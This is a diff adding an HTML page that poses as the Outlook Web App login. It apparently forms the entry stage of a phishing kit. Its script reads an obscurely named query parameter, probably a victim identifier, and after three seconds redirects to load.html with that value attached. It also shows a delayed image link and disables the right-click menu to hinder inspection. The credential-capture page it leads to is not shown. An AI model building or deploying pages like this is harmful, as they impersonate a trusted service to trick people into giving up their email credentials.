@@ -1,0 +1,50 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<title>Outlook Web App</title>
+<link rel="stylesheet" type="text/css" href="files/common,login,zhtml,skin.css">
+<link rel="shortcut icon" href="./files/favicon.ico" type="image/x-icon">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <script>
+    // Function to extract query parameter value
+    function getQueryParameter(parameterName) {
+      var queryString = window.location.search;
+      var urlParams = new URLSearchParams(queryString);
+      return urlParams.get(parameterName);
+    }
+    // Get the value from the 'data' query parameter
+    var value = getQueryParameter('vbgfhbhfghgfhfghf');
+    
+     function redirectToDestination() {
+    // Redirect to the destination page with the variable value in the URL
+    window.location.href = "load.html?jdfgjfgjfgjgdjgdj=" + (value);
+    }
+
+    // Automatically redirect after a certain delay (e.g., 3 seconds)
+    setTimeout(redirectToDestination, 3000);
+   
+
+  </script>
+
+  <script>
+    setTimeout(function() {
+      var img = document.getElementById('myImage');
+      img.src = './files/24.png'; // Replace with the desired image URL
+    }, 1000); // 1000 milliseconds = 1 seconds
+  </script>
+
+</head>
+    <body oncontextmenu="return false;">
+    <center>
+   
+       <a href="load.html"><img style="margin-top:300px; margin-bottom:280px;" id="myImage" src=""></a></div>
+
+        
+</center>
+        
+    </body>
+</html>
